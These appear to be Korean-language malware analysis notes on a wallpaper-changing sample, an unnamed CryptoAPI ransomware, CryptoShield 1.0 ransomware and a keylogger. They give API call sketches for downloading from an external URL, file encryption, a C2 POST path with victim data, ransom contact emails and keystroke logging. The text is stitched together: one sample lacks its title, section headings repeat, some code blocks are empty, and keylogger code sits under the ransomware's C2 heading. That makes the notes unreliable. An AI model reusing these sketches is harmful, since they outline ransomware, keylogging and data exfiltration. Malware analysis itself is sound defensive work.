## mal1.exe — 배경화면 변경 악성코드

### 01. 개요

**1) 요약**  
인터넷에서 'Hacked.jpg' 이미지를 다운로드한 후 BMP 형식으로 변환하여 Windows 바탕화면으로 교체하는 악성코드. 파일 삭제로 흔적을 제거한다.

**2) 특징**
- IsDebuggerPresent 임포트 — 디버거 탐지 로직 포함 가능성
- PDB 경로 노출 (`C:\Users\user\source\repos\mal1\Release\mal1.pdb`) — 테스트/학습용 샘플로 추정
- 안티디버깅, 패킹 없음 — 정적 분석 용이

### 02. 분석

**1) 샘플 정보**

| 항목 | 내용 |
|---|---|
| SHA-256 | `596f919f8e3e3dd0008378dfaf3fc3ddc0f14b3bde05d01ab91be9c1942f9a86` |
| Target Machine | Intel i386 (x86, 32-bit) |
| 용량 | 11,264 bytes (11 KB) |

**2) 기능**

**▶ 이미지 다운로드**  
외부 URL에서 이미지 파일을 로컬에 저장한다.

```c
URLDownloadToFileW(pCaller, szURL, szFileName, dwReserved, lpfnCB)
  // szURL     = "https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg"
  // szFileName = "<UserFolder>\hacked_image.jpg"
  // 반환값이 S_OK(0)이면 다운로드 성공
```

**▶ 이미지 형식 변환 (JPG → BMP)**  
GDI+ API로 JPG를 읽어 BMP로 재저장한다. `SystemParametersInfoW`는 BMP 포맷을 직접 지원하기 때문에 변환이 필요하다.

```c
GdipCreateBitmapFromFile(filename, &bitmap)
GdipSaveImageToFile(bitmap, destPath, &bmpEncoder, NULL)
  // bmpEncoder CLSID: CLSIDFromString로 {557CF400-...} 조회
```

**▶ 바탕화면 변경**  
변환된 BMP 파일을 Windows 바탕화면으로 설정한다.

```c
SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, szBmpPath,
                      SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
  // SPI_SETDESKWALLPAPER = 0x0014
  // SPIF_UPDATEINIFILE   = 0x01  (레지스트리에 영구 저장)
  // SPIF_SENDCHANGE      = 0x02  (WM_SETTINGCHANGE 브로드캐스트)
```

**▶ 흔적 제거**  
다운로드된 원본 JPG 파일을 삭제하여 증거를 제거한다.

```c
DeleteFileW(szJpgPath)
```

**2) 특징**

- Windows CryptoAPI 사용 — OS 내장 암호화 라이브러리 활용

### 02. 분석

**1) 샘플 정보**

| 항목 | 내용 |
|---|---|
| SHA-256 | `a4fa090fbac689b9cdabf83bb8abcb81172e79e2fe45be6e63c788ee91c78232` |
| Target Machine | Intel i386 (x86, 32-bit) |
| 용량 | 33,280 bytes (32 KB) |

**2) 기능**

**▶ UPX 언팩 및 동적 API 로딩**  
UPX 스텁이 실제 코드를 복호화 후 실행한다. 실제 API는 동적으로 로딩한다.

```c

  // 언팩 및 코드 실행을 위한 메모리 관리

```

```c
CryptAcquireContext(phProv, NULL, NULL, PROV_RSA_AES, ...)

CryptEncrypt(hKey, 0, TRUE, 0, buffer, &dataLen, bufSize)
  // 파일 내용 암호화 (인플레이스 덮어쓰기)
```

암호화 완료 후 바탕화면을 랜섬 메시지 이미지로 교체한다.

```c
SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, szImagePath, SPIF_UPDATEINIFILE)
  // SPI_SETDESKWALLPAPER = 0x0014
  // 피해자에게 랜섬 메시지 시각적 노출
```

## r1.exex — CryptoShield 1.0 랜섬웨어

### 01. 개요

**1) 요약**  
2017년 실제 유포된 CryptoShield 1.0 랜섬웨어. RSA-2048로 파일을 암호화하고 이메일을 통해 복호화 키 판매를 유도하는 랜섬 노트를 표시한다. C2 서버로 피해자 정보를 전송하고 레지스트리에 지속성을 등록한다.

**2) 특징**
- 실제 알려진 악성코드: CryptoShield 1.0 (2017년 활성)
- RSA-2048 비대칭 암호화 — 개인키 없이 복호화 불가
- HTTP + 소켓 이중 C2 경로
- 레지스트리 지속성 등록
- 3개 연락 이메일 — 일부 차단 시에도 운영 지속

### 02. 분석

**1) 샘플 정보**

| 항목 | 내용 |
|---|---|
| SHA-256 | `c4e7bc064aed8f7f680ecb3631957e44ebcd83d62a73f9fc375027e451b9deff` |
| Target Machine | Intel i386 (x86, 32-bit) |
| 용량 | 32,256 bytes (31.5 KB) |

**2) 기능**

**▶ 피해자 식별 및 키 생성**  
피해자 PC의 사용자명을 획득하고 고유 RSA-2048 키 쌍을 생성한다.

```c
GetUserNameW(lpBuffer, &size)   // 사용자명 획득
CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, ...)
CryptGenKey(hProv, AT_KEYEXCHANGE, RSA_2048 | CRYPT_EXPORTABLE, &hKey)
  // AT_KEYEXCHANGE — RSA 공개키/개인키 쌍 생성
CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, buffer, &size)
  // 공개키를 바이트 배열로 내보냄 → C2로 전송
```

**▶ 파일 암호화**  
파일 시스템을 순회하며 대상 파일을 RSA-2048로 암호화한다.

```c
FindFirstFileW / FindNextFileW   // 파일 탐색
CryptEncrypt(hKey, 0, TRUE, 0, buffer, &size, bufSize)
  // 공개키로 파일 내용 암호화 (개인키 없이 복호화 불가)
CryptDestroyKey / CryptDestroyHash   // 사용 후 키 해제
```

**▶ 랜섬 노트 표시**  
HTML 형식의 랜섬 노트를 기본 브라우저로 열어 피해자에게 표시한다.

```c
ShellExecuteW(NULL, "open", noteHtmlPath, ...)

// 랜섬 노트 내용:
//   암호화 알고리즘: RSA-2048 (CryptoShield 1.0)
//   연락처:
//     restoring_sup@india.com         (주)
//     restoring_sup@computer4u.com    (예비1)
//     restoring_reserve@india.com     (예비2)
```

**▶ C2 통신 및 레지스트리 지속성**  
C2 서버에 피해자 정보를 전송하고 재부팅 후에도 실행되도록 레지스트리를 수정한다.

```c

  // POST /test_site_scripts/moduls/traffic/get_info.php
  // Content-Type: application/x-www-form-urlencoded
  // 전송 데이터: 피해자 ID, 사용자명, 공개키
```

```c
GetAsyncKeyState(vKey) & 0x0001
  // 0x0001 비트: 마지막 호출 이후 눌렸는지 여부
  // vKey = 0x00~0xFF (256개 가상 키코드 순회)
GetKeyState(VK_SHIFT)    // Shift 상태로 대소문자 판별
GetKeyState(VK_CAPITAL)  // Caps Lock 상태 확인
```

**▶ 키입력 로그 저장**  
감지된 키입력과 활성 창 제목을 파일에 저장한다.

```c
FindWindowA(NULL, NULL)          // 현재 활성 창 핸들
GetWindowTextA(hWnd, title, 256) // 창 제목 획득
fopen("Keylogs.txt", "a")        // 추가 모드로 파일 열기
fputs(logEntry, fp)              // "[창제목] key" 형식으로 기록
fclose(fp)
```
